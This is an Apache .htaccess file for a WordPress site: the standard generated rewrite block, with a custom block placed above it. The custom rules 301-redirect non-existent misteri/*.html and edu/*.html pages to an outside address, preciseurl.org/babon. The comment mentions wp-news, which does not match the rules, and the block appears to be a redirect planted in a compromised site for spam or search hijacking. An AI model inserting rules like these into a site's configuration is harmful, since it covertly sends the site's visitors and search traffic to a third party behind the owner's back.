 ==========================
# Custom Rewrite Rule
# ==========================
<IfModule mod_rewrite.c>
    RewriteEngine On

    # Redirect wp-news/*.html to external URL if not a file or directory
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^misteri/[^/]+\.html$ https://preciseurl.org/babon [R=301,L,QSA]
    RewriteRule ^edu/[^/]+\.html$ https://preciseurl.org/babon [R=301,L,QSA]
</IfModule>

# ==========================
# BEGIN WordPress
# ==========================
# The directives (lines) between "BEGIN WordPress" and "END WordPress" are
# dynamically generated, and should only be modified via WordPress filters.
# Any changes to the directives between these markers will be overwritten.
<IfModule mod_rewrite.c>
    RewriteEngine On

    # Pass HTTP Authorization header to PHP
    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]

    RewriteBase /
    RewriteRule ^index\.php$ - [L]

    # Redirect all other requests to index.php if not a file or directory
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
# ==========================
# END WordPress
